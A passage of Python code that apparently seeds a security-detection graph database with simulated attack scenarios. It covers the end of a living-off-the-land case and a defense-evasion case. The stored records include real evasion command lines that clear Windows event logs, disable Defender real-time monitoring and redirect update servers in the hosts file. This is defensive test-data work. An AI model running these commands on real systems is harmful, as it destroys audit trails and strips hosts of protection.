        MERGE (wscript:Process {id: $wscript_id})
          ON CREATE SET
            wscript.pid           = 5800,
            wscript.name          = 'wscript.exe',
            wscript.path          = 'C:\\\\Windows\\\\System32\\\\wscript.exe',
            wscript.command_line  = 'wscript.exe C:\\\\Windows\\\\Temp\\\\payload.vbs',
            wscript.hostname      = 'WORKSTATION-05',
            wscript.username      = 'carol',
            wscript.timestamp     = $ts,
            wscript.integrity_level = 'Medium',
            wscript.is_elevated   = false

        MERGE (u)-[:OWNS]->(cmd)
        MERGE (cmd)-[:SPAWNED]->(certutil)
        MERGE (certutil)-[:CREATED]->(payload)
        MERGE (certutil)-[:CONNECTED_TO]->(nc_dl)
        MERGE (cmd)-[:SPAWNED]->(mshta)
        MERGE (cmd)-[:SPAWNED]->(regsvr)
        MERGE (cmd)-[:SPAWNED]->(wscript)
        MERGE (h)-[:HAS_PROCESS]->(cmd)
        MERGE (h)-[:HAS_PROCESS]->(certutil)
        MERGE (h)-[:HAS_PROCESS]->(mshta)
        MERGE (h)-[:HAS_PROCESS]->(regsvr)
        MERGE (h)-[:HAS_PROCESS]->(wscript)

        RETURN 'done' AS status
        """

        self._client.execute_write(
            cypher,
            params={
                "host_id": _uid(),
                "user_id": "user-carol-lolbins",
                "cmd_id": "proc-cmd-lolbins",
                "certutil_id": "proc-certutil-lolbins",
                "payload_id": "file-payload-lolbins",
                "nc_dl_id": "nc-download-lolbins",
                "mshta_id": "proc-mshta-lolbins",
                "regsvr_id": "proc-regsvr32-lolbins",
                "wscript_id": "proc-wscript-lolbins",
                "ts": ts,
            },
        )
        return {"nodes": 10, "edges": 11}

    # ------------------------------------------------------------------
    # Scenario: Defense Evasion
    # ------------------------------------------------------------------

    def seed_defense_evasion(self) -> Dict[str, int]:
        """
        Seed a defense-evasion scenario.

        Pattern: malicious process clears Windows event logs via wevtutil.exe,
        disables Windows Defender real-time protection via PowerShell,
        and modifies the hosts file to block AV signature update servers.

        Triggers rules:
        - Event log clearing
        - AV real-time protection disabled
        - Hosts file modification
        - Indicator removal on host
        """
        ts = _now_iso()

        cypher = """
        MERGE (h:Host {hostname: 'WORKSTATION-06'})
          ON CREATE SET h.ip_address = '10.0.1.60', h.os = 'Windows 10', h.id = $host_id

        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'SYSTEM', u.domain = 'NT AUTHORITY', u.hostname = 'WORKSTATION-06'

        // Attacker cmd launches evasion chain
        MERGE (cmd:Process {id: $cmd_id})
          ON CREATE SET
            cmd.pid           = 7100,
            cmd.name          = 'cmd.exe',
            cmd.path          = 'C:\\\\Windows\\\\System32\\\\cmd.exe',
            cmd.command_line  = 'cmd.exe /c wevtutil cl System & wevtutil cl Security & wevtutil cl Application',
            cmd.hostname      = 'WORKSTATION-06',
            cmd.username      = 'SYSTEM',
            cmd.timestamp     = $ts,
            cmd.integrity_level = 'System',
            cmd.is_elevated   = true

        // wevtutil clears event logs
        MERGE (wevtutil:Process {id: $wevt_id})
          ON CREATE SET
            wevtutil.pid            = 7200,
            wevtutil.name           = 'wevtutil.exe',
            wevtutil.path           = 'C:\\\\Windows\\\\System32\\\\wevtutil.exe',
            wevtutil.command_line   = 'wevtutil.exe cl Security',
            wevtutil.hostname       = 'WORKSTATION-06',
            wevtutil.username       = 'SYSTEM',
            wevtutil.timestamp      = $ts,
            wevtutil.integrity_level = 'System',
            wevtutil.is_elevated    = true

        // PowerShell disables Defender
        MERGE (ps_def:Process {id: $ps_def_id})
          ON CREATE SET
            ps_def.pid          = 7300,
            ps_def.name         = 'powershell.exe',
            ps_def.path         = 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe',
            ps_def.command_line = 'powershell.exe -NoP -Exec Bypass Set-MpPreference -DisableRealtimeMonitoring $true',
            ps_def.hostname     = 'WORKSTATION-06',
            ps_def.username     = 'SYSTEM',
            ps_def.timestamp    = $ts,
            ps_def.integrity_level = 'System',
            ps_def.is_elevated  = true

        // Hosts file (target of modification)
        MERGE (hosts:File {id: $hosts_id})
          ON CREATE SET
            hosts.path         = 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts',
            hosts.name         = 'hosts',
            hosts.extension    = '',
            hosts.size_bytes   = 4096,
            hosts.is_executable = false,
            hosts.timestamp    = $ts,
            hosts.hostname     = 'WORKSTATION-06'

        // PowerShell process that modifies hosts file
        MERGE (ps_hosts:Process {id: $ps_hosts_id})
          ON CREATE SET
            ps_hosts.pid            = 7400,
            ps_hosts.name           = 'powershell.exe',
            ps_hosts.path           = 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe',
            ps_hosts.command_line   = 'powershell.exe -c "Add-Content C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts 0.0.0.0 update.microsoft.com"',
            ps_hosts.hostname       = 'WORKSTATION-06',
            ps_hosts.username       = 'SYSTEM',
            ps_hosts.timestamp      = $ts,
            ps_hosts.integrity_level = 'System',
            ps_hosts.is_elevated    = true

        MERGE (u)-[:OWNS]->(cmd)
        MERGE (cmd)-[:SPAWNED]->(wevtutil)
        MERGE (cmd)-[:SPAWNED]->(ps_def)
        MERGE (cmd)-[:SPAWNED]->(ps_hosts)
        MERGE (ps_hosts)-[:MODIFIED]->(hosts)
        MERGE (h)-[:HAS_PROCESS]->(cmd)
        MERGE (h)-[:HAS_PROCESS]->(wevtutil)
        MERGE (h)-[:HAS_PROCESS]->(ps_def)
        MERGE (h)-[:HAS_PROCESS]->(ps_hosts)

        RETURN 'done' AS status
        """

        self._client.execute_write(
            cypher,
            params={
                "host_id": _uid(),
                "user_id": "user-system-defevasion",
                "cmd_id": "proc-cmd-defevasion",
                "wevt_id": "proc-wevtutil-defevasion",
                "ps_def_id": "proc-ps-defender",
                "hosts_id": "file-hosts-defevasion",
                "ps_hosts_id": "proc-ps-hosts",
                "ts": ts,
            },
        )
        return {"nodes": 7, "edges": 8}
